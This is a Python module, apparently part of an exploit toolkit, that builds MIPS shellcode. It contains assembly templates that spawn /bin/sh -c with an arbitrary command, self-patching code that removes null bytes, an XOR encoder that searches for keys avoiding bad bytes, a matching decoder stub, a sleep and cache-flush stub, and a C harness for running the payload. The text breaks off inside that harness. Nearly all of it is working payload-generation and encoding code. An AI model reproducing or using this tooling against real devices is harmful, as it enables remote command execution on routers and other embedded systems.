import logging
import os
import random
import shutil
import struct
import subprocess

from config import CONFIG
import print_as_py_and_c
from print_as_py_and_c import *


class Mips_Generate_short_shellcode:
    ASM_MIPS = """
        .set noreorder
        li      $a2,1638
        bltzal  $a2,0
        slti    $a2,$zero,-1

        addiu   $sp,$sp,-32
        addiu   $s3,$ra,4097
        addiu   $a0,$s3,-3997
        addiu   $a1,$s3,-3989
        addiu   $a2,$s3,-3986

        # 自修复代码
        lw   $t2,-4101($s3)
        lw   $t3,-3993($s3)
        addu   $t3,$t3,$t2
        sw      $t3,-3993($s3)
        lw   $t3,-3989($s3)
        addu   $t3,$t3,$t2
        sw      $t3,-3989($s3)

        lw   $t3,-{offset}($s3)
        addu   $t3,$t3,$t2
        sw      $t3,-{offset}($s3)
        # end

        sw      $a0,-24($sp)
        sw		$a1,-20($sp)
        sw      $a2,-16($sp)
        sw      $zero,-12($sp)

        addiu   $a1,$sp,-24
        addiu   $s4,$zero,1111   #将 $a2设置为0
        addiu   $a2,$s4,-1111
        li      $v0,4011
        syscall 0x40404

        # --- 第 4 部分：数据区 ---
        .asciiz "/bin/sh"
        .asciiz "-c"
        .asciiz "{command}"
    """
    def __init__(self, command: str, endian: str, save_file: bool = False):
        self.command = command
        self.endian = endian
        self.save_file = save_file
        self.generate_shellcode(command, endian)
        self.shllcode = None

    def generate_shellcode(self, command: str, endian: str):
        # 确保输出目录存在
        try:
            asm_file_path = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "mips_test_shellcode.s")
            obj_file_path = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "mips_test_shellcode.o")
            bin_file_path = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "mips_test_shellcode.bin")

            # --- 1、先生成shellcode确认偏移地址 ---
            temp_asm = self.ASM_MIPS.format(command=command, offset=3985)
            with open(asm_file_path, "w") as f:
                f.write(temp_asm)
            subprocess.run([f"{CONFIG['MIPS_TOOLCHAIN_PATH']}as", "-o", obj_file_path, asm_file_path], check=True)
            # result = subprocess.run([f"{CONFIG['MIPS_TOOLCHAIN_PATH']}objdump", "-d", bin_file_path], capture_output=True,
            #                         text=True, check=True)
            # print(result.stdout.strip())
            # print("------------------------------\n")
            subprocess.run(
                [f"{CONFIG['MIPS_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "--only-section=.text", obj_file_path,
                 bin_file_path], check=True)
            with open(bin_file_path, "rb") as f:
                shellcode = f.read()
            # ---获取偏移地址---
            logging.info(f"[START]")
            _, offset = self.strip_trailing_null_blocks(shellcode)
            logging.info(f"[mips] 第一次编译 确认自修复的偏移地址 : {(offset)}")

            # --- 2、传入真实的偏移地址 ---
            temp_asm = self.ASM_MIPS.format(command=command, offset=offset)
            with open(asm_file_path, "w") as f:
                f.write(temp_asm)
            subprocess.run([f"{CONFIG['MIPS_TOOLCHAIN_PATH']}as", "-o", obj_file_path, asm_file_path], check=True)
            subprocess.run(
                [f"{CONFIG['MIPS_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "--only-section=.text", obj_file_path,
                 bin_file_path], check=True)
            with open(bin_file_path, "rb") as f:
                shellcode = f.read()
            # print("编译成功! Shellcode 已生成到:", bin_file_path)
            shellcode, _ = self.strip_trailing_null_blocks(shellcode)
            logging.info(f"[mips] 第二次编译 生成 MIPS shellcode : {(shellcode.hex())}")
            modified_shellcode = self.patch_shellcode_segment(shellcode, endian)
            logging.info(f"[mips] patch_shellcode_segment 运算后的 shellcode : {(modified_shellcode.hex())}")
            logging.info(f"[END]")
            print(f"✅ 生成 MIPS shellcode 成功! 长度: {len(modified_shellcode)} 字节")
            print_as_py_and_c.print_as_python_bytes(modified_shellcode)
            # found, bad_bytes = check_bad_bytes(modified_shellcode)
            # print(f"shellcode: 在shellcode中找到坏字节？{found}, 坏字节列表: {bad_bytes}")
            self.shellcode = modified_shellcode
            # MipsVerifyShellcode(modified_shellcode)

        except FileNotFoundError:
            print(
                f"[!] 错误: MIPS 交叉编译工具链未找到, 请检查 CONFIG['MIPS_TOOLCHAIN_PATH'] 的设置: '{CONFIG['MIPS_TOOLCHAIN_PATH']}'")
        except subprocess.CalledProcessError as e:
            print(f"[!] 编译失败: {e}")
            if hasattr(e, 'stderr') and e.stderr:
                print(f"错误详情: {e.stderr.decode('utf-8', 'ignore')}")
        finally:
            if self.save_file == False:
                for f in [asm_file_path, obj_file_path, bin_file_path]:
                    if os.path.exists(f):
                        os.remove(f)
            else:
                print_process_file_path(None, asm_file_path, obj_file_path, None, bin_file_path)


    def patch_shellcode_segment(self, shellcode: bytes, endian: str) -> bytes:
        """
        分两阶段修改 MIPS Shellcode，并支持大小端字节序。

        阶段 1: 核心修补 (插入和 T1/T2 减法)
        1. 计算：(原索引 112-115 的值) - 0x22222222，生成 T1 结果。
        2. 计算：(原索引 116-119 的值) - 0x22222222，生成 T2 结果。
        3. 在原索引 8 处，插入 4 字节的 0x22222222 (Shellcode 长度增加 4 字节)。
        4. 将 T1 和 T2 的计算结果替换到原索引 112 开始的 8 字节位置。

        阶段 2: command 0x00 字节块修补
        5. 遍历阶段 1 结果中所有包含 Null 字节 ('\x00') 的 4 字节块。
        6. 将这些块的值减去 0x22222222 后，将结果写回原位置。

        参数:
            shellcode (bytes): 原始的机器码字节串。
            endianness_format (str): 字节序格式字符串。默认为 '>I' (大端，Big-Endian)，
                                     可设置为 '<I' (小端，Little-Endian)。

        返回:
            bytes: 两次修补后的机器码字节串 (长度增加 4 字节)。
        """
        if endian == "big":
            endianness_format = '>I'
        else:
            endianness_format = '<I'
        # 定义函数内部常量
        SUBTRAHEND_VALUE = 0x22222222
        INSERTION_SIZE = 4

        # 根据传入的格式打包 0x22222222
        SUBTRAHEND_BYTES = struct.pack(endianness_format, SUBTRAHEND_VALUE)

        # --- 阶段 1: 核心修补 (插入和 T1/T2 减法) ---
        logging.info("[mips] --- 阶段 1: 核心修补 (插入和 T1/T2 减法) ---")

        # 定义索引 (针对原始 shellcode)
        S_INSERT_INDEX = 8
        T1_START = 112
        T1_END = 116
        T2_START = 116
        T2_END = 120
        TOTAL_REPLACEMENT_END = T2_END

        required_length = TOTAL_REPLACEMENT_END
        if len(shellcode) < required_length:
            print(
                f"错误: shellcode 长度不足 {required_length} 字节。至少需要 {required_length} 字节。当前长度: {len(shellcode)}")
            return shellcode

        # 1. 处理目标 1 (T1: 112-115)
        t1_original_bytes = shellcode[T1_START:T1_END]
        # 使用参数化的字节序
        t1_original_value, = struct.unpack(endianness_format, t1_original_bytes)
        t1_result_value = t1_original_value - SUBTRAHEND_VALUE
        # 使用参数化的字节序
        t1_new_bytes = struct.pack(endianness_format, t1_result_value & 0xFFFFFFFF)

        # 2. 处理目标 2 (T2: 116-119)
        t2_original_bytes = shellcode[T2_START:T2_END]
        # 使用参数化的字节序
        t2_original_value, = struct.unpack(endianness_format, t2_original_bytes)
        t2_result_value = t2_original_value - SUBTRAHEND_VALUE
        # 使用参数化的字节序
        t2_new_bytes = struct.pack(endianness_format, t2_result_value & 0xFFFFFFFF)

        # 3. 重新组合 shellcode (执行插入和替换)
        T1_T2_new_bytes = t1_new_bytes + t2_new_bytes

        shellcode_stage1 = (
                shellcode[0:S_INSERT_INDEX] +  # 1. Header [0:8]
                SUBTRAHEND_BYTES +  # 2. 插入 [8:12] - 0x22222222
                shellcode[S_INSERT_INDEX:T1_START] +  # 3. Middle Segment [8:112] (被推后了)
                T1_T2_new_bytes +  # 4. T1+T2 结果 (替换原 [112:120] 区域)
                shellcode[TOTAL_REPLACEMENT_END:]  # 5. Trailer [120:] (被推后了)
        )

        # --- 阶段 1 结束 ---
        # --- 阶段 2: command 0x00 字节块修补---
        segment_size = 4
        null_byte = b'\x00'
        # 将 shellcode_stage1 (bytes) 转换为 bytearray 进行可变操作
        mutable_patch_target = bytearray(shellcode_stage1)
        modified_count = 0
        logging.info("[mips] --- 阶段 2: command 0x00 字节块修补 ---")
        # 遍历可变目标
        for i in range(0, len(mutable_patch_target), segment_size):
            chunk = mutable_patch_target[i:i + segment_size]
            if len(chunk) != segment_size:
                continue
            # 检查当前 4 字节块中是否存在 null 字节
            if null_byte in chunk:
                # 1. 读取当前值 (使用参数化的字节序)
                current_value, = struct.unpack(endianness_format, chunk)
                # 2. 计算新值: T_new = T_original - 0x22222222
                new_value = current_value - SUBTRAHEND_VALUE
                # 3. 打包结果回 4 字节 (使用参数化的字节序)
                new_bytes = struct.pack(endianness_format, new_value & 0xFFFFFFFF)
                # 4. 替换原位置的字节
                logging.info(f"[mips] [PATCHED] 索引 {i:3} 到 {i + 3:3} (原值: 0x{chunk.hex()}) -> 新值: 0x{new_bytes.hex()}")
                # 使用 bytearray 的切片赋值
                mutable_patch_target[i:i + segment_size] = new_bytes
                modified_count += 1
        logging.info(f"[mips] --- command 0x00 字节块处理完成。共修补 {modified_count} 个块。---")
        # --- 阶段 2 结束 ---
        # 返回最终结果，类型为 bytes
        return bytes(mutable_patch_target)

    def strip_trailing_null_blocks(self, shellcode: bytes) -> bytes:
        """
        优化去除末尾的空字节：仅当末尾的 4 字节块全部是 \x00 时，才去除该块。
        新增功能：如果块中包含 \x00 字节，则输出该块的起始索引。

        参数:
            shellcode (bytes): 原始的机器码字节串。

        返回:
            bytes: 去除完整空字节块后的机器码字节串。
        """
        block_size = 4
        null_byte = b'\x00'
        start_index = 120  # 从索引 120 开始检测

        # 1. 原始逻辑修改为 全局去除所有全零块
        new_shellcode_list = []
        original_shellcode_len = len(shellcode)
        # 遍历所有块
        for i in range(0, original_shellcode_len, block_size):
            chunk = shellcode[i:i + block_size]

            # 检查是否是完整的 4 字节块
            if len(chunk) != block_size:
                # 处理不完整的尾部块，总是保留
                new_shellcode_list.append(chunk)
                continue
            # 检查是否是完整的 4 字节全零块
            if chunk == b'\x00' * block_size:
                # 如果是，去除这个块（不添加到 new_shellcode_list）
                logging.info(f"[mips] [REMOVED] 去除全零块，原始起始索引: {i:3}  0x{chunk.hex()}")
            else:
                # 如果不是，保留
                new_shellcode_list.append(chunk)
        shellcode = b"".join(new_shellcode_list)

        # 2. 新增功能 (后执行): 遍历剩余的 shellcode 并检查是否存在 \x00 字节
        for i in range(start_index, len(shellcode), block_size):
            chunk = shellcode[i:i + block_size]
            # 仅检查完整的 4 字节块
            if len(chunk) == block_size and null_byte in chunk:
                logging.info(f"[mips] [FOUND] 块索引 {i:3} 包含一个或多个 Null 字节 (内容: 0x{chunk.hex()})")
                offset = (4097 - 112 - (i - 120))
        return shellcode, offset

class MipsShellcodeGenerator:
    """
    一个用于生成 MIPS (o32 ABI) execve shellcode 的类。

    该类将 MIPS 汇编模板、用户命令和交叉编译工具链结合起来，
    自动完成汇编、链接和提取字节码的整个过程。
    """
    # 汇编代码模板，与您提供的 mips_shellcode.S 文件内容一致。
    # 我们保留了一个占位符 {command_string_len} 以便动态计算偏移。
    ASM_TEMPLATE = """
# MIPS execve("/bin/sh", ["/bin/sh", "-c", command], NULL) shellcode
.section .text
.globl __start
.set noreorder

__start:
    # --- 第 1 部分：位置无关代码 (PIC) ---
    bal     find_data
    nop                 # 分支延迟槽, $ra 将指向这里

find_data:
    # $ra 现在指向 nop 指令。
    # 我们需要计算从 nop 到数据区的偏移。
    # 代码部分共 14 条指令 = 56 字节。
    addu $s0, $ra, 56   # $s0 = 数据区的基地址

    # --- 第 2 部分：在栈上构建参数数组 (argv) ---
    move $s1, $s0                               # $s1 -> "/bin/sh"
    addiu $s2, $s0, 8                           # $s2 -> "-c"
    addiu $s3, $s0, 11                          # $s3 -> your_cmd

    # 为 argv 数组在栈上分配空间 (4个指针 = 16字节)
    addiu $sp, $sp, -16

    sw $s1, 0($sp)      # argv[0] = &"/bin/sh"
    sw $s2, 4($sp)      # argv[1] = &"-c"
    sw $s3, 8($sp)      # argv[2] = &command
    sw $zero, 12($sp)   # argv[3] = NULL

    # --- 第 3 部分：执行系统调用 ---
    move $a0, $s1       # a0 = path
    move $a1, $sp       # a1 = argv
    move $a2, $zero     # a2 = envp

    li $v0, 4011        # syscall: execve
    syscall

# --- 第 4 部分：数据区 ---
.asciiz "/bin/sh"
.asciiz "-c"
.asciiz "{command}"
"""

    def __init__(self, cmd, save_file=False):
        """
        初始化生成器。

        :param cmd: 您希望 shellcode 执行的命令字符串 (例如 "ls -l")。
        :param cross_compiler_prefix: MIPS 交叉编译工具链的前缀。
        """
        if not cmd:
            raise ValueError("命令不能为空。")
        self.cmd = cmd
        self.save_file = save_file
        self.raw_shellcode = None
        self.generate()

    def generate(self):
        """
        执行编译流程并生成 shellcode。
        :return: 包含原始 shellcode 的 bytes 对象，如果失败则返回 None。
        """
        final_asm_code = self.ASM_TEMPLATE.format(command=self.cmd)
        try:
            asm_file_path = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "mips_raw_shellcode.s")
            obj_file_path = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "mips_raw_shellcode.o")
            elf_file_path = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "mips_raw_shellcode.elf")
            bin_file_path = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "mips_raw_shellcode.bin")
            # 1. 写入汇编文件
            with open(asm_file_path, "w") as f:
                f.write(final_asm_code)
            # 2. 汇编 (as)
            subprocess.run([f"{CONFIG['MIPS_TOOLCHAIN_PATH']}as", "-o", obj_file_path, asm_file_path], check=True)
            # 3. 链接 (ld)
            subprocess.run([f"{CONFIG['MIPS_TOOLCHAIN_PATH']}ld", "-o", elf_file_path, obj_file_path], check=True)
            # 4. 提取 .text 段 (objcopy)
            subprocess.run([
                f"{CONFIG['MIPS_TOOLCHAIN_PATH']}objcopy",
                "-O", "binary",
                "--only-section=.text",
                elf_file_path,
                bin_file_path
            ], check=True)

            # 5. 读取最终的 shellcode
            with open(bin_file_path, "rb") as f:
                self.raw_shellcode = f.read()
        except Exception as e:
            # 🟢 捕捉真实编译错误，不再让异常死得不明不白
            print(f"\n[-] 编译链执行失败: {e}")
            return None

        finally:
            # 清理临时文件
            if self.save_file == False:
                for f in [asm_file_path, obj_file_path, elf_file_path, bin_file_path]:
                    if os.path.exists(f):
                        os.remove(f)
            else:
                print_process_file_path(None, asm_file_path, obj_file_path, elf_file_path, bin_file_path)


class MipsShellcodeGenerator_long:
    def __init__(self, cmd, arch, save_file=False):
        self.cmd = cmd
        self.arch = arch
        self.save_file = save_file
        self.xxd_bin_file = None
        self.raw_shellcode = None
        self.generate()

    def generate(self):
        """
        根据指定的架构(arm/mips)和命令生成对应的shellcode。

        Args:
            cmd (str): 希望shellcode执行的命令，例如 "ls -l"。
            arch (str): 目标架构，'arm' 或 'mips'。

        Returns:
            bytes: 生成的原始二进制shellcode。
        """
        asm_code = """
        __asm__ volatile (
            "li $v0, 4011\\n\\t"
            "move $a0, %0\\n\\t"
            "move $a1, %1\\n\\t"
            "li $a2, 0\\n\\t"
            "syscall\\n\\t"
            :
            : "r"(arg0), "r"(args)
            : "$v0", "$a0", "$a1", "$a2"
        );
        """
        # --- 2. 构建完整的C语言源码 ---
        # 使用C代码动态构建字符串和参数数组
        shellcode_c = f"""
    #include <sys/syscall.h>

    void _start() {{
        // 构建 execve 的参数
        {self.format_c_char_array("arg0", "/bin/sh")}
        {self.format_c_char_array("arg1", "-c")}
        {self.format_c_char_array("arg2", self.cmd)}

        char *args[] = {{arg0, arg1, arg2, 0}};

        // 执行特定架构的内联汇编
        {asm_code}
    }}
    """
        # --- 3. 编译并提取二进制代码 ---
        # 使用临时文件来处理编译过程
        c_file = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "mips_raw_shellcode.c")
        elf_file = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "mips_raw_shellcode")
        bin_file = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "mips_raw_shellcode.bin")

        try:
            with open(c_file, "w") as fd:
                fd.write(shellcode_c)
            # 1. 编译C代码为ELF文件
            # -nostdlib: 不链接标准库，对于shellcode至关重要
            # -static: 静态链接，避免依赖动态库
            # -O0: 关闭优化，确保代码行为与源码一致
            subprocess.run(
                [f"{CONFIG['MIPS_TOOLCHAIN_PATH']}gcc", "-fno-stack-protector", "-nostdlib", "-static", "-O0", "-o",
                 elf_file, c_file],
                capture_output=True, text=True
            )
            # 2. 从ELF文件中提取纯二进制的.text段
            subprocess.run(
                [f"{CONFIG['MIPS_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "-j", ".text", elf_file, bin_file],
                capture_output=True, text=True
            )
            # 3. 使用objdump查看反汇编结果
            subprocess.run(
                [f"{CONFIG['MIPS_TOOLCHAIN_PATH']}objdump", "-D", "-b", "binary", "-m", self.arch.lower(), bin_file],
                capture_output=True, text=True
            )
            # 4. 读取生成的二进制shellcode
            self.xxd_bin_file = subprocess.run(
                ["xxd", "-i", bin_file],
                capture_output=True, text=True
            )
            with open(bin_file, "rb") as fd:
                self.raw_shellcode = fd.read()
        finally:
            # 清理临时文件
            if self.save_file == False:
                for f in [c_file, elf_file, bin_file]:
                    if os.path.exists(f):
                        os.remove(f)
            else:

                print_process_file_path(c_file, None, None, elf_file, bin_file)

    def format_c_char_array(self, var_name, string):
        """
        将一个Python字符串格式化为C语言的字符数组初始化代码。
        例如: "sh" -> char sh[3]; sh[0] = 's'; sh[1] = 'h'; sh[2] = '\0';
        """
        output = []
        length = len(string) + 1  # 为空终止符 '\0' 增加空间
        output.append(f"char {var_name}[{length}];")
        for i, c in enumerate(string):
            # 处理C语言中的特殊字符转义
            if c == "'":
                c_repr = "\\'"
            elif c == '\\':
                c_repr = '\\\\'
            elif c == '\n':
                c_repr = '\\n'
            elif c == '\t':
                c_repr = '\\t'
            else:
                c_repr = c
            output.append(f"{var_name}[{i}] = '{c_repr}';")
        output.append(f"{var_name}[{length - 1}] = '\\0';")
        return "\n".join(output)


class XorEncoder:
    def __init__(self, raw_shellcode, endian, bad_bytes):
        """
        初始化XOR编码器。
        Args:
            raw_shellcode (bytes): 需要被编码的原始二进制shellcode。
            bad_bytes (list, optional): 不应出现的坏字节列表 (整数形式)。默认为 [0x00, 0x0a, 0x26]。
        """
        # --- 1. 初始化属性 ---
        self.raw_shellcode = raw_shellcode
        # 使用三元表达式来设置默认的坏字节列表
        self.bad_bytes_list = bad_bytes

        # 使用集合进行快速查找，效率更高
        self.bad_bytes_set = set(self.bad_bytes_list)

        # 初始化将要计算的属性
        self.attempts = None
        self.key = None
        self.xor_encoded_shellcode = None
        self.xor_encoded_shellcode_bin_file = os.path.join(CONFIG["SHELLCODE_DIRECTORY"],
                                                           "mips_xor_encoded_shellcode.bin")
        # print(f"[+] XOR 编码，处理坏字节...   定义的坏字节: {[hex(b) for b in self.bad_bytes_list]}")
        print(f"[+] 对原始 shellcode 进行 xor 编码，处理坏字节:")
        self.endian = endian

        # --- 2. 立即执行编码流程 ---
        self.generate()

    def _pad_shellcode(self):
        """
        将shellcode填充到4字节的倍数，以进行安全的DWORD操作。
        使用 NOP (0x00) 指令进行填充，这是一个常见的做法。
        """
        padding_needed = (4 - len(self.raw_shellcode) % 4) % 4
        padded_shellcode = self.raw_shellcode
        if padding_needed > 0:
            print(f"    -- Shellcode长度不是4的倍数，需要用 NOP 填充 {padding_needed} 字节。")
            # NOP指令的字节表示
            nop_instruction = b'\x00'
            # 检查NOP指令本身是否是坏字节
            if 0x00 in self.bad_bytes_set:
                raise ValueError("填充字节 0x00 是一个坏字节，无法进行填充。请考虑其他填充方案。")
            padded_shellcode += nop_instruction * padding_needed
        return padded_shellcode

    def generate(self):
        """
        循环寻找安全的XOR密钥并加密payload。
        一个安全的密钥及其加密后的shellcode都不应包含任何坏字节。
        """
        padded_shellcode = self._pad_shellcode()

        attempts = 0
        max_attempts = 100000  # 设定最大尝试次数，防止无限循环

        while True:
            attempts += 1
            if attempts > max_attempts:
                raise RuntimeError(f"在 {max_attempts} 次尝试后仍未找到安全密钥。请检查坏字节列表或shellcode。")

            # 随机生成一个4字节（32位）的密钥
            key_int = random.randint(1, 0xFFFFFFFF)
            key_bytes = key_int.to_bytes(4, self.endian)

            # 1. 检查密钥本身是否包含坏字节
            if any(b in self.bad_bytes_set for b in key_bytes):
                continue  # 密钥不安全，尝试下一个

            # 2. 使用此候选密钥加密整个shellcode
            encoded_buffer = bytearray()
            is_encoded_safe = True
            for i in range(0, len(padded_shellcode), 4):
                chunk = padded_shellcode[i:i + 4]
                dword = int.from_bytes(chunk, self.endian)
                xored_dword_int = dword ^ key_int
                xored_dword_bytes = xored_dword_int.to_bytes(4, self.endian)

                # 3. 检查加密后的块是否包含坏字节
                if any(b in self.bad_bytes_set for b in xored_dword_bytes):
                    is_encoded_safe = False
                    break  # 此密钥生成的编码不安全，停止当前加密并尝试新密钥

                encoded_buffer.extend(xored_dword_bytes)

            # 如果整个编码过程都安全，我们就找到了最终的密钥和编码
            if is_encoded_safe:
                self.key = key_int
                self.xor_encoded_shellcode = bytes(encoded_buffer)
                self.attempts = attempts
                # print(f"✅  成功！在 {self.attempts} 次尝试后找到安全密钥: {hex(self.key)}")

                # 将编码后的shellcode写入文件
                # try:
                #     with open(self.xor_encoded_shellcode_bin_file, "wb") as f:
                #         f.write(self.xor_encoded_shellcode)
                # except IOError as e:
                #     print(f"[!] 错误：无法将文件写入磁盘: {e}")

                return  True


class XorDecoder:
    """
    负责管理解码器模板，并组装最终的shellcode。
    """
    MIPS_DECODER_TEMPLATE = """
    .section .text
    .global __start
    .set noreorder
    __start:
    li $t8, -0x666
    p:
    bltzal $t8, p
    slti $t8, $zero, -1
    li $s1, {val_for_payload_start}
    nor $s1, $s1, $s1
    addu $s1, $ra, $s1
    li $t2, {val_for_loop_count}
    nor $t2, $t2, $t2
    addu $t0, $t2, $t2
    addu $t0, $t0, $t0
    addu $t0, $s1, $t0
    lui $t1, {key_high}
    ori $t1, $t1, {key_low}
    decode_loop:
    lw $t6, -4($t0)
    nor $t5, $t1, $t1
    and $t4, $t6, $t5
    nor $t5, $t6, $t6
    and $t5, $t5, $t1
    or $t4, $t4, $t5
    sw $t4, -4($t0)
    addu $t0, $t0, -4
    addiu $t2, $t2, -1
    bne $t2, $zero, decode_loop
    slti $at, $at, -1
    finished:
    jalr $ra, $s1
    slti $at, $at, -1
    """

    def __init__(self, shellcode, key, save_file=False):
        """
        初始化XOR解码器。

        Args:
            shellcode (bytes): 需要被解码的加密二进制shellcode。
            key (int): 用于解码的密钥。
            verbose (bool): 如果为True，则打印详细的编译和调试信息。
        """
        self.shellcode = shellcode
        self.key = key
        self.val_for_payload_start = None
        self.val_for_loop_count = None
        self.xor_decoded_shellcode_bin_file = os.path.join(CONFIG["SHELLCODE_DIRECTORY"],
                                                           "mips_xor_decoded_shellcode.bin")
        self.xor_decoded_shellcode = None
        self.save_file = save_file
        self._decode_len()

    def _decode_len(self):
        key_high = hex(self.key >> 16)
        key_low = hex(self.key & 0xFFFF)
        loop_count = len(self.shellcode) // 4
        val_for_loop_count = -(loop_count + 1)
        temp_asm = self.MIPS_DECODER_TEMPLATE.format(
            val_for_payload_start=-1, val_for_loop_count=-1,
            key_high=key_high, key_low=key_low
        )
        self._generate_decoder(temp_asm, save_file=False)
        # offset_to_payload = len(self.xor_decoded_shellcode) - 8
        # self.val_for_payload_start = -(offset_to_payload + 1)
        offset_to_payload = len(self.xor_decoded_shellcode) - 8
        self.val_for_payload_start = -(offset_to_payload - 3)
        final_asm = self.MIPS_DECODER_TEMPLATE.format(
            val_for_payload_start=self.val_for_payload_start,
            val_for_loop_count=val_for_loop_count,
            key_high=key_high,
            key_low=key_low
        )
        self._generate_decoder(final_asm, save_file=self.save_file)

    def _generate_decoder(self, asm_code, save_file):
        try:
            """编译汇编代码并提取.text节，返回二进制数据和其长度。"""
            asm_file  = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "mips_xor_decoder.s")
            obj_file = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "mips_xor_decoder.o")
            bin_file = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "mips_xor_decoder.bin")
            with open(asm_file , "w") as f:
                f.write(asm_code)
            subprocess.run([f"{CONFIG['MIPS_TOOLCHAIN_PATH']}as", "-o", obj_file, asm_file ], capture_output=True)
            subprocess.run([f"{CONFIG['MIPS_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "-j", ".text", obj_file, bin_file],
                           capture_output=True)
            with open(bin_file, "rb") as f:
                binary_data = f.read()
                # 【关键修复】在返回前就移除末尾的空字节
                self.xor_decoded_shellcode = binary_data.rstrip(b'\x00')
        finally:
            # 清理临时文件
            if save_file == False:
                for f in [asm_file , obj_file, bin_file]:
                    if os.path.exists(f):
                        os.remove(f)
            else:
                print_process_file_path(None, asm_file, obj_file, None, bin_file)


class Sleep:
    """
    一个独立的类，专门用于生成一段MIPS sleep(0)存根的二进制shellcode。
    这段代码旨在通过强制上下文切换来解决指令缓存(I-Cache)同步问题。
    """

    # --- 类属性：MIPS汇编模板 ---
    MIPS_SLEEP_TEMPLATE = """
#
# MIPS Sleep 存根汇编模板 (自由落体版)
#
.section .text
.global __start
.set noreorder

__start:
    # --- 使用 bal 技巧获取当前代码位置，用于计算下一段 payload 的地址 ---
    bal     get_pc
    nop                         # 延迟槽。执行后，$ra 会指向 get_pc 标签处

get_pc:
    # --- 计算下一段 payload 的地址，为 cacheflush 做准备 ---
    # $ra 指向了本条 addiu 指令。从这里到这个代码块的末尾共有 14 条指令 (14 * 4 = 56 字节)。
    # 所以 $ra + 56 就是下一段 payload (自由落体目标) 的起始地址。
    addiu   $s1, $ra, 56

    # --- Sleep 逻辑 ---
    addiu   $sp, $sp, -8
    li      $t0, 3
    sw      $t0, 0($sp)
    sw      $zero, 4($sp)
    move    $a0, $sp
    li      $v0, 4166           # nanosleep
    syscall
    addiu   $sp, $sp, 8

    # --- [关键] 清空下一段 payload 所在区域的指令缓存 ---
    move    $a0, $s1            # a0 = 要刷新的地址 (下一段payload的开头)
    li      $a1, 1024           # a1 = 刷新的长度 (一个足够大的值即可)
    li      $a2, 1              # a2 = 1 表示刷新 I-cache
    li      $v0, 4147           # cacheflush 系统调用号
    syscall

# --- [注意] 这里没有跳转指令，代码会直接“落体”到下一段 shellcode ---
"""

    def __init__(self, save_file=False, verbose=False):
        """
        初始化Sleep存根生成器。

        Args:
            save_file (bool): 如果为True，则在当前目录保存最终的.bin文件。
            verbose (bool): 如果为True，则打印详细的编译和调试信息。
        """
        self.save_file = save_file
        self.verbose = verbose
        self.bin_file_name = "sleep_stub.bin"
        self.Sleep_shellcode = None
        self.generate()

    def generate(self):
        """
        执行完整的编译流程，并返回二进制的sleep存根。

        Returns:
            bytes: 生成的二进制代码；如果失败则返回None。
        """
        # 使用临时目录来处理编译过程中的中间文件
        s_file = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "mips_sleep_shellcode.s")
        o_file = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "mips_sleep_shellcode.o")
        bin_file = os.path.join(CONFIG["SHELLCODE_DIRECTORY"], "mips_sleep_shellcode.bin")

        # 将汇编模板写入.s文件
        with open(s_file, "w") as f:
            f.write(self.MIPS_SLEEP_TEMPLATE)

        if self.verbose:
            print(f"[Sleep Class] Compiling assembly file: {s_file}")

        # 编译汇编代码为对象文件(.o)
        # 使用 -c 选项只编译不链接，这是生成shellcode的关键
        subprocess.run([f"{CONFIG['MIPS_TOOLCHAIN_PATH']}gcc", "-c", "-nostdlib", "-o", o_file, s_file],
                       capture_output=True, text=True)
        if self.verbose:
            print(f"[Sleep Class] Extracting .text section from {o_file}")
        # 从对象文件中提取.text节，生成纯二进制文件
        subprocess.run([f"{CONFIG['MIPS_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "-j", ".text", o_file, bin_file],
                       capture_output=True, text=True)

        # 读取最终的二进制数据
        with open(bin_file, "rb") as fd:
            sleep_shellcode = fd.read()
        self.Sleep_shellcode = sleep_shellcode
        if self.save_file:
            shutil.copy(bin_file, self.bin_file_name)
            print(f"[+] Sleep存根已保存为: {self.bin_file_name} ({len(sleep_shellcode)} bytes)")


class MipsVerifyShellcode:
    """
    一个用于生成、编译并执行C语言Shellcode测试框架的类。
    它接收原始的二进制数据(bytes)并自动格式化。
    """

    def __init__(self, shellcode_bytes):
        """
        初始化生成器。
        参数:
            shellcode_bytes (bytes): 完整的、最终的shellcode二进制数据。
        """
        if not isinstance(shellcode_bytes, bytes):
            raise TypeError("shellcode_bytes 参数必须是 bytes 类型。")
        self.shellcode_bytes = shellcode_bytes
        self.generate_and_run()

    def _format_shellcode_as_c_string(self):
        """
        [修正] 将二进制数据格式化为C语言的字符串字面量数组。
        """
        if not self.shellcode_bytes:
            return '    "";'
        c_string_lines = []
        for i in range(0, len(self.shellcode_bytes), 4):
            chunk = self.shellcode_bytes[i:i + 4]
            hex_string = "".join([f"\\x{byte:02x}" for byte in chunk])
            c_string_lines.append(f'"{hex_string}"')
        return '\n'.join(c_string_lines) + '\n;'

    def generate_and_run(self):
        """
        生成、编译并执行完整的C语言测试文件。

        参数:
            qemu_path (str): QEMU静态模拟器的路径。
        """

        # 1. [修正] 准备C代码前，先格式化shellcode
        formatted_shellcode = self._format_shellcode_as_c_string()
        final_c_code_bak = f"""
#include <stdio.h>
#include <string.h>

char shellcode[] =
{formatted_shellcode}


void main(void)
{{
    printf("[+] Shellcode 大小: %zu 字节\\n", sizeof(shellcode) - 1);
    void (*s)(void) = (void (*)())shellcode;
    printf("[+] 准备执行shellcode...\\n");
    s();
    printf("[+] Shellcode 执行完毕。\\n");
}}
"""
        final_c_code = f"""
        #include <stdio.h>
        #include <string.h>
        #include <sys/mman.h>

        unsigned char shellcode[] =
        {formatted_shellcode}
        int main() {{
            void *exec_mem = mmap(NULL, sizeof(shellcode),
